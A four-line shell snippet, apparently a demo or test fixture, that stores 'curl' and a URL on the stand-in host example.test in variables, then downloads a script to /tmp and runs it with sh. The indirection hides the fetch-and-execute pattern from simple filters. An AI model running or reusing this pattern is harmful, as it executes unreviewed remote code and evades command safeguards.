a=curl
b=https://example.test/x.sh
"$a" -fsSL "$b" -o /tmp/cg-demo
sh /tmp/cg-demo
